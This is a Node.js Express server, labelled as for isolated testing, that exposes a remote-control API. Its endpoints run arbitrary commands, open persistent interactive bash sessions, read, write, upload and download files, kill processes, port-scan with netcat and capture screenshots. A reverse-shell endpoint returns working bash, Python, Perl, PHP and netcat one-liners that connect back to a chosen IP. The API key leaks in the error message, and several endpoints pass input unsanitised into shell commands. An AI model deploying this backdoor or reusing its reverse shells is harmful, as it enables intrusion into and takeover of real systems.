// server.js - Enhanced Remote Control API
// WARNING: Untuk testing environment TERISOLASI saja!

const express = require('express');
const cors = require('cors');
const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Authentication
const API_KEY = crypto.randomBytes(32).toString('hex');
console.log(`🔑 API Key: ${API_KEY}`);

// Middleware Authentication
const authenticate = (req, res, next) => {
    const authHeader = req.headers['x-api-key'] || req.query.api_key;
    
    if (!authHeader || authHeader !== API_KEY) {
        return res.status(401).json({ 
            error: 'Unauthorized',
            hint: `Use ?api_key=${API_KEY} or X-API-Key header`
        });
    }
    next();
};

// Rate limiting
const rateLimit = {};
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS = 30;

const checkRateLimit = (req, res, next) => {
    const ip = req.ip;
    const now = Date.now();
    
    if (!rateLimit[ip]) {
        rateLimit[ip] = { count: 1, firstRequest: now };
    } else {
        if (now - rateLimit[ip].firstRequest > RATE_LIMIT_WINDOW) {
            rateLimit[ip] = { count: 1, firstRequest: now };
        } else {
            rateLimit[ip].count++;
            if (rateLimit[ip].count > MAX_REQUESTS) {
                return res.status(429).json({ error: 'Rate limit exceeded' });
            }
        }
    }
    next();
};

// Safe command execution with timeout
const safeExec = (command, timeout = 10000) => {
    return new Promise((resolve, reject) => {
        const child = exec(command, { timeout }, (error, stdout, stderr) => {
            if (error) {
                resolve({ error: error.message, stderr, code: error.code });
            } else {
                resolve({ stdout, stderr });
            }
        });
    });
};

// File operations with sanitization
const sanitizePath = (userPath) => {
    const normalized = path.normalize(userPath);
    // Prevent directory traversal
    if (normalized.includes('..') || normalized.startsWith('/')) {
        throw new Error('Path traversal attempt blocked');
    }
    return normalized;
};

// REST API Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        server: {
            platform: os.platform(),
            arch: os.arch(),
            uptime: os.uptime(),
            load: os.loadavg(),
            memory: {
                total: os.totalmem(),
                free: os.freemem()
            }
        }
    });
});

// Get system info
app.get('/api/system', authenticate, async (req, res) => {
    try {
        const [disk, processes, network] = await Promise.all([
            safeExec('df -h'),
            safeExec('ps aux | head -20'),
            safeExec('ifconfig || ip addr')
        ]);
        
        res.json({
            hostname: os.hostname(),
            userInfo: os.userInfo(),
            cpus: os.cpus(),
            networkInterfaces: os.networkInterfaces(),
            disk,
            processes,
            network
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Execute command (with optional backend)
app.post('/api/execute', authenticate, checkRateLimit, async (req, res) => {
    const { command, backend = 'bash', timeout = 5000 } = req.body;
    
    if (!command || typeof command !== 'string') {
        return res.status(400).json({ error: 'Command is required' });
    }
    
    // Command length limit
    if (command.length > 1000) {
        return res.status(400).json({ error: 'Command too long' });
    }
    
    // Dangerous command blocking
    const dangerousPatterns = [
        /rm\s+-rf/,
        /mkfs/,
        /dd\s+if=.*of=\/dev/,
        /:\s*{\s*:\s*\|/,
        /chmod\s+777/,
        />\s*\/dev\/sda/,
        /nc\s+.*-e/,
        /wget\s+.*\|\s*sh/,
        /curl\s+.*\|\s*bash/
    ];
    
    for (const pattern of dangerousPatterns) {
        if (pattern.test(command)) {
            return res.status(403).json({ error: 'Dangerous command blocked' });
        }
    }
    
    try {
        let fullCommand = command;
        
        switch (backend) {
            case 'python':
                fullCommand = `python3 -c "${command.replace(/"/g, '\\"')}"`;
                break;
            case 'node':
                fullCommand = `node -e "${command.replace(/"/g, '\\"')}"`;
                break;
            case 'php':
                fullCommand = `php -r "${command.replace(/"/g, '\\"')}"`;
                break;
            case 'bash':
            default:
                fullCommand = command;
        }
        
        const result = await safeExec(fullCommand, timeout);
        res.json({
            success: true,
            command: fullCommand,
            timestamp: new Date().toISOString(),
            ...result
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// File operations
app.get('/api/files/list', authenticate, async (req, res) => {
    const { dir = '.' } = req.query;
    
    try {
        const sanitizedDir = sanitizePath(dir);
        const files = fs.readdirSync(sanitizedDir);
        
        const fileDetails = files.map(file => {
            const filePath = path.join(sanitizedDir, file);
            const stats = fs.statSync(filePath);
            return {
                name: file,
                path: filePath,
                size: stats.size,
                isDirectory: stats.isDirectory(),
                modified: stats.mtime,
                permissions: stats.mode.toString(8)
            };
        });
        
        res.json({
            path: sanitizedDir,
            files: fileDetails
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/files/read', authenticate, (req, res) => {
    const { file } = req.query;
    
    if (!file) {
        return res.status(400).json({ error: 'File parameter required' });
    }
    
    try {
        const sanitizedFile = sanitizePath(file);
        const content = fs.readFileSync(sanitizedFile, 'utf8');
        
        res.json({
            file: sanitizedFile,
            size: content.length,
            content: content
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/files/write', authenticate, (req, res) => {
    const { file, content, append = false } = req.body;
    
    if (!file || content === undefined) {
        return res.status(400).json({ error: 'File and content required' });
    }
    
    try {
        const sanitizedFile = sanitizePath(file);
        
        if (append) {
            fs.appendFileSync(sanitizedFile, content);
        } else {
            fs.writeFileSync(sanitizedFile, content);
        }
        
        res.json({
            success: true,
            file: sanitizedFile,
            operation: append ? 'appended' : 'written'
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Process management
app.get('/api/processes', authenticate, async (req, res) => {
    try {
        const result = await safeExec('ps aux');
        const processes = result.stdout.split('\n')
            .filter(line => line.trim())
            .map(line => {
                const parts = line.trim().split(/\s+/);
                return {
                    user: parts[0],
                    pid: parts[1],
                    cpu: parts[2],
                    mem: parts[3],
                    command: parts.slice(10).join(' ')
                };
            });
        
        res.json({ processes });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/processes/kill', authenticate, async (req, res) => {
    const { pid, signal = 'TERM' } = req.body;
    
    if (!pid) {
        return res.status(400).json({ error: 'PID required' });
    }
    
    try {
        const result = await safeExec(`kill -${signal} ${pid}`);
        res.json({
            success: true,
            pid,
            signal,
            result
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Network utilities
app.get('/api/network/scan', authenticate, async (req, res) => {
    const { target = 'localhost', ports = '1-1000' } = req.query;
    
    try {
        // Simple port scanner using netcat
        const scanCommand = `timeout 5 nc -zv ${target} ${ports} 2>&1 || echo "Scan complete"`;
        const result = await safeExec(scanCommand, 10000);
        
        res.json({
            target,
            ports,
            result: result.stdout
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Shell session (persistent)
const sessions = {};

app.post('/api/shell/start', authenticate, (req, res) => {
    const sessionId = crypto.randomBytes(16).toString('hex');
    
    // Create a persistent shell session
    const shell = spawn('/bin/bash', ['-i'], {
        stdio: ['pipe', 'pipe', 'pipe']
    });
    
    sessions[sessionId] = {
        shell,
        buffer: '',
        createdAt: new Date()
    };
    
    // Capture output
    shell.stdout.on('data', (data) => {
        sessions[sessionId].buffer += data.toString();
    });
    
    shell.stderr.on('data', (data) => {
        sessions[sessionId].buffer += data.toString();
    });
    
    shell.on('exit', () => {
        delete sessions[sessionId];
    });
    
    res.json({
        sessionId,
        pid: shell.pid,
        started: new Date().toISOString()
    });
});

app.post('/api/shell/command', authenticate, (req, res) => {
    const { sessionId, command } = req.body;
    
    if (!sessions[sessionId]) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    const session = sessions[sessionId];
    session.buffer = ''; // Clear buffer
    
    session.shell.stdin.write(command + '\n');
    
    // Wait for output
    setTimeout(() => {
        res.json({
            output: session.buffer,
            sessionId,
            timestamp: new Date().toISOString()
        });
    }, 500);
});

// Upload file (base64)
app.post('/api/upload', authenticate, (req, res) => {
    const { filename, data, directory = '.' } = req.body;
    
    if (!filename || !data) {
        return res.status(400).json({ error: 'Filename and data required' });
    }
    
    try {
        const sanitizedDir = sanitizePath(directory);
        const sanitizedFile = sanitizePath(filename);
        const filePath = path.join(sanitizedDir, sanitizedFile);
        
        // Decode base64
        const buffer = Buffer.from(data, 'base64');
        fs.writeFileSync(filePath, buffer);
        
        res.json({
            success: true,
            file: filePath,
            size: buffer.length,
            uploaded: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Download file (base64)
app.get('/api/download', authenticate, (req, res) => {
    const { file } = req.query;
    
    if (!file) {
        return res.status(400).json({ error: 'File parameter required' });
    }
    
    try {
        const sanitizedFile = sanitizePath(file);
        const buffer = fs.readFileSync(sanitizedFile);
        const base64Data = buffer.toString('base64');
        
        res.json({
            filename: path.basename(sanitizedFile),
            data: base64Data,
            size: buffer.length,
            mimeType: 'application/octet-stream'
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Database operations (if MySQL/PostgreSQL available)
app.post('/api/db/query', authenticate, async (req, res) => {
    const { type, query, host = 'localhost', user, password, database } = req.body;
    
    try {
        let result;
        
        switch (type) {
            case 'mysql':
                result = await safeExec(`mysql -h ${host} -u ${user} -p${password} ${database} -e "${query.replace(/"/g, '\\"')}"`);
                break;
            case 'postgres':
                result = await safeExec(`PGPASSWORD=${password} psql -h ${host} -U ${user} -d ${database} -c "${query.replace(/"/g, '\\"')}"`);
                break;
            default:
                return res.status(400).json({ error: 'Unsupported database type' });
        }
        
        res.json({
            success: true,
            type,
            query,
            result: result.stdout
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Reverse shell generator
app.post('/api/reverse-shell', authenticate, (req, res) => {
    const { ip, port = 4444, type = 'bash' } = req.body;
    
    if (!ip) {
        return res.status(400).json({ error: 'IP address required' });
    }
    
    const shells = {
        bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`,
        perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`,
        php: `php -r '$s=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`,
        nc: `nc -e /bin/bash ${ip} ${port}`
    };
    
    res.json({
        ip,
        port,
        type,
        command: shells[type] || shells.bash,
        instructions: `Listen first: nc -lvp ${port}`
    });
});

// Screenshot (if X11/display available)
app.get('/api/screenshot', authenticate, async (req, res) => {
    try {
        const result = await safeExec('which import xwd scrot 2>/dev/null | head -1');
        
        if (result.stdout.includes('import')) {
            await safeExec('import -window root /tmp/screenshot.png');
        } else if (result.stdout.includes('scrot')) {
            await safeExec('scrot /tmp/screenshot.png');
        } else {
            return res.status(404).json({ error: 'No screenshot tool available' });
        }
        
        const buffer = fs.readFileSync('/tmp/screenshot.png');
        const base64 = buffer.toString('base64');
        
        res.json({
            success: true,
            format: 'png',
            data: base64,
            size: buffer.length
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Web interface
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔧 Remote Control API</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #1a1a1a; color: #f0f0f0; }
            .container { max-width: 1200px; margin: auto; }
            .card { background: #2d2d2d; padding: 20px; margin: 15px 0; border-radius: 10px; border-left: 4px solid #4CAF50; }
            pre { background: #000; color: #0f0; padding: 15px; border-radius: 5px; overflow-x: auto; }
            .api-key { background: #ffeb3b; color: #000; padding: 5px 10px; border-radius: 3px; font-weight: bold; }
            .endpoint { color: #4CAF50; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔧 Remote Control API Server</h1>
            
            <div class="card">
                <h2>🔑 Authentication</h2>
                <p>API Key: <span class="api-key">${API_KEY}</span></p>
                <p>Use: <code>?api_key=${API_KEY}</code> or <code>X-API-Key</code> header</p>
            </div>
            
            <div class="card">
                <h2>📡 Available Endpoints</h2>
                <ul>
                    <li><span class="endpoint">GET /api/health</span> - Server status</li>
                    <li><span class="endpoint">GET /api/system</span> - System information</li>
                    <li><span class="endpoint">POST /api/execute</span> - Execute commands</li>
                    <li><span class="endpoint">GET /api/files/list</span> - List directory</li>
                    <li><span class="endpoint">GET /api/files/read</span> - Read file</li>
                    <li><span class="endpoint">POST /api/files/write</span> - Write file</li>
                    <li><span class="endpoint">GET /api/processes</span> - List processes</li>
                    <li><span class="endpoint">POST /api/processes/kill</span> - Kill process</li>
                    <li><span class="endpoint">POST /api/shell/start</span> - Start shell session</li>
                    <li><span class="endpoint">POST /api/shell/command</span> - Execute in shell session</li>
                    <li><span class="endpoint">POST /api/upload</span> - Upload file</li>
                    <li><span class="endpoint">GET /api/download</span> - Download file</li>
                    <li><span class="endpoint">POST /api/reverse-shell</span> - Generate reverse shell</li>
                </ul>
            </div>
            
            <div class="card">
                <h2>🔧 Example Usage</h2>
                <pre>
// Execute command
curl -X POST http://localhost:3000/api/execute \\
  -H "X-API-Key: ${API_KEY}" \\
  -H "Content-Type: application/json" \\
  -d '{"command": "whoami && pwd", "backend": "bash"}'

// List files
curl "http://localhost:3000/api/files/list?api_key=${API_KEY}&dir=."

// Start shell session
curl -X POST http://localhost:3000/api/shell/start \\
  -H "X-API-Key: ${API_KEY}" \\
  -H "Content-Type: application/json"
                </pre>
            </div>
            
            <div class="card">
                <h2>⚠️ Security Warning</h2>
                <p>This server provides extensive system access. Use only in:</p>
                <ul>
                    <li>Isolated testing environments</li>
                    <li>Controlled lab networks</li>
                    <li>Virtual machines with snapshots</li>
                </ul>
                <p>Do NOT expose to public internet without additional security measures!</p>
            </div>
        </div>
        
        <script>
        // Auto-refresh API key display
        document.addEventListener('DOMContentLoaded', function() {
            const keyElement = document.querySelector('.api-key');
            setInterval(() => {
                keyElement.style.opacity = keyElement.style.opacity === '0.5' ? '1' : '0.5';
            }, 1000);
        });
        </script>
    </body>
    </html>
    `);
});

// Error handling
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔══════════════════════════════════════════════╗
    ║       🔧 REMOTE CONTROL API SERVER          ║
    ║            (POWERFULL VERSION)              ║
    ╚══════════════════════════════════════════════╝
    
    📍 Server: http://0.0.0.0:${PORT}
    🔑 API Key: ${API_KEY}
    
    ⚠️  WARNING: This server provides FULL SYSTEM ACCESS
    ⚠️  Use ONLY in isolated testing environments!
    
    📚 Available Features:
    ✓ Command execution (bash, python, node, php)
    ✓ File operations (read/write/upload/download)
    ✓ Process management
    ✓ Persistent shell sessions
    ✓ Network scanning
    ✓ Database operations
    ✓ Reverse shell generation
    ✓ Screenshot capture
    
    💡 Quick Start:
    curl "http://localhost:${PORT}/api/health"
    curl "http://localhost:${PORT}/api/system?api_key=${API_KEY}"
    
    🔒 Security Note:
    - API Key is required for all operations
    - Rate limiting enabled (30 req/min)
    - Dangerous commands are filtered
    - Path traversal protection
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n\n🛑 Shutting down server...');
    
    // Cleanup shell sessions
    Object.keys(sessions).forEach(sessionId => {
        sessions[sessionId].shell.kill();
    });
    
    process.exit(0);
});